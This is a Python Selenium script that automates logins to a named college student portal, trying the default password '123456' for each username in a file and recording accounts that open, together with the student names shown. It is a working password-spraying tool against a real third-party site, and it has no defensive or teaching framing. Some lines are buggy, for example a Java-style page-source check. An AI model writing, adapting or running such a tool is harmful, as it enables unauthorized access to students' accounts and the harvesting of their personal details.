import time
import os
from selenium import webdriver
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.common.action_chains import ActionChains


passwords= ['123456']									#Passwords
			
url = "http://pict.ethdigitalcampus.com/PICT/"						#LoginURL
curuser=''
filelength = sum(1 for line in open('username.txt'))

def readuser():
	f = open('username.txt', '+r')
	cur=f.readline().rstrip()
	x = f.read();
	f2= open('temp.txt','w')
	f2.write(x);
	f.close()	
	f2.close()
	os.remove('username.txt')
	os.rename('temp.txt', 'username.txt')
	passwords[0]='123456'
	return cur

def	loginuserpass(passw):
	flag = 0
	username = driver.find_element_by_name("loginid")		
	username.clear()
	print("username: "+curuser)
	username.send_keys(curuser)		
	password = driver.find_element_by_name("password")
	password.clear()
	print("password: "+passw+"\n")
	password.send_keys(passw)
	driver.find_element_by_xpath('//*[@id="table1"]/tbody/tr[3]/td[2]/div/input[1]').click()	
	try:
		WebDriverWait(driver, 3).until(EC.alert_is_present(),
                                   'Timed out waiting for PA creation ' +
                                   'confirmation popup to appear.')
		alert = driver.switch_to.alert
		alert.accept()
	except:
		pass
	finally:
		try:
			info = driver.find_element_by_xpath('//*[@id="top-info"]/div/h3').text
			print("Student: "+info)
			f3.write(curuser+' '+passw+' '+info+'\n');
		except:
			pass
		try:
			WebDriverWait(driver, 3).until(EC.alert_is_present(),
                                   'Timed out waiting for PA creation ' +
                                   'confirmation popup to appear.')
			alert = driver.switch_to.alert
			alert.accept()
		except:
			pass    

driver = webdriver.Firefox()
driver.get(url)
print("No. of usernames to try: "+str(filelength)+"\n")

for i in range(filelength):								#No of lines in usernames.txt
	curuser=readuser()
	f3= open('list.txt','a')
	for i in range(len(passwords)):
		driver.get(url)
		if driver.find_element_by_name("loginid"):
			loginuserpass(passwords[i])
			i+=1
		elif driver.getPageSource().contains("You are already logged in"):
			print("SUCCESS")
			f3= open('list.txt','w')
			f3.write(curuser+passwords[i]+'\n');
			f3.close()
			driver.get(url)
		
